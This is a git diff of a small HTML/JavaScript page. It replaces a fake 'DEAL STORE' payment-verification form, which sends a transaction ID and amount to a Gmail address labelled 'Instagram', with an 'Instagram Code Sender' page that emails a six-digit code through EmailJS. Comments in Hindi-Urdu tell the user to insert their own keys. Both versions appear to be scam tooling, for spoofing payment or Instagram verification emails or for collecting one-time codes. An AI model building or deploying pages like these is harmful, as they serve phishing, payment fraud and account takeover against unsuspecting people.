@@ -3,81 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEAL STORE</title>
+<title>Send Code</title>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <style>
-body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;padding:15px;margin:0}
-.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:100%;max-width:380px;text-align:center}
-.uc{width:75px;height:75px;background:orange;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:24px;margin:0 auto 12px;border:3px solid #000}
-label{display:block;text-align:left;font-weight:bold;margin:12px 0 5px}
-input{width:100%;padding:13px;border:2px solid #ddd;border-radius:10px;box-sizing:border-box}
-.btn{width:100%;margin-top:14px;padding:16px;background:#f7b500;border:2px solid #000;border-radius:12px;font-weight:900;font-size:16px;cursor:pointer}
-.step{display:none} .step.active{display:block}
-.success{background:#e8f5e9;border:1px solid #4caf50;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold}
+body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#fff;padding:25px;border-radius:12px;width:90%;max-width:350px;box-shadow:0 4px 10px rgba(0,0,0,0.1)}
+input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:18px;text-align:center;letter-spacing:5px;box-sizing:border-box}
+button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
+button:active{opacity:0.8}
 </style>
 </head>
 <body>
-
-<div class="box step active" id="step1">
-<div class="uc">UC</div>
-<h2>Payment Verification</h2>
-<label>Amount</label>
-<input type="number" id="amount" value="1500">
-<label>Screenshot</label>
-<input type="file" id="ss" accept="image/*" style="border:2px dashed #f7b500;background:#fffbe6;padding:10px;border-radius:10px">
-<button class="btn" onclick="nextStep()">VERIFY TO CHECK →</button>
-</div>
-
-<div class="box step" id="step2">
-<div class="uc">UC</div>
-<h2>Transaction ID</h2>
-<input id="txn" type="tel" placeholder="542546585" style="font-size:40px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:80px">
-<div id="ok2" class="success" style="display:none"></div>
-<div style="display:flex;gap:8px;margin-top:12px">
-<button class="btn" style="background:#fff;flex:1" onclick="backStep()">← BACK</button>
-<button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">SUBMIT ID</button>
-</div>
+<div class="box">
+<h3 style="text-align:center;margin:0 0 15px 0">Instagram Code Sender</h3>
+<input type="text" id="codeInput" placeholder="160443" maxlength="6">
+<button onclick="sendCode()" id="btn">Send Code</button>
+<p id="msg" style="text-align:center;font-size:13px;margin-top:10px"></p>
 </div>
 
 <script>
-emailjs.init("M1gpuw8FX2OfMZz2-");
-const SERVICE_ID = "service_m2y2j8e";
-const TEMPLATE_ID = "template_2r1r6ii";
+// ===== YAHAN APNI KEYS DALO =====
+const SERVICE_ID = "service_xxxx"; // Email Services se copy karo
+const TEMPLATE_ID = "template_2r1r6ii"; // Ye sahi hai, change mat karna
+const PUBLIC_KEY = "your_public_key_here"; // Account > Public Key se copy karo
+// =================================
 
-function nextStep(){
- let a=document.getElementById('amount').value;
- let f=document.getElementById('ss').files[0];
- if(!a){alert('Amount likho');return;}
- if(!f){alert('Screenshot select karo');return;}
- document.getElementById('step1').classList.remove('active');
- document.getElementById('step2').classList.add('active');
-}
-function backStep(){
- document.getElementById('step2').classList.remove('active');
- document.getElementById('step1').classList.add('active');
-}
-function sendTxn(){
- let id=document.getElementById('txn').value.trim();
- let amount=document.getElementById('amount').value;
- if(id.length<3){alert('Transaction ID likho');return;}
- let btn=document.getElementById('btn2');
- let ok=document.getElementById('ok2');
- btn.innerText='Sending...';
- emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-   transaction_code: id,
-   amount: amount,
-   to_email: "uaepass499@gmail.com",
-   name: "Instagram"
- }).then(()=>{
-   ok.style.display='block';
-   ok.innerText="✅ "+id+" - Email bhej diya! Check inbox uaepass499@gmail.com";
-   btn.innerText='SENT ✅';
- }, (err)=>{
-   ok.style.display='block';
-   ok.innerText="❌ Error: "+JSON.stringify(err);
-   btn.innerText='TRY AGAIN';
-   console.log(err);
- });
+emailjs.init(PUBLIC_KEY);
+
+function sendCode(){
+  let code = document.getElementById("codeInput").value.trim();
+  let btn = document.getElementById("btn");
+  let msg = document.getElementById("msg");
+  
+  if(code.length < 4){ alert("Code likho!"); return; }
+  
+  btn.innerText = "Sending...";
+  btn.disabled = true;
+
+  emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+    transaction_code: code,
+    amount: "USD 0.00"
+  }).then(() => {
+    msg.innerText = "✓ Sent! Gmail app me check karo - upar Code box ayega";
+    msg.style.color = "green";
+    btn.innerText = "Send Code";
+    btn.disabled = false;
+  }).catch((err) => {
+    msg.innerText = "Error: " + JSON.stringify(err);
+    msg.style.color = "red";
+    btn.innerText = "Send Code";
+    btn.disabled = false;
+  });
 }
 </script>
 </body>
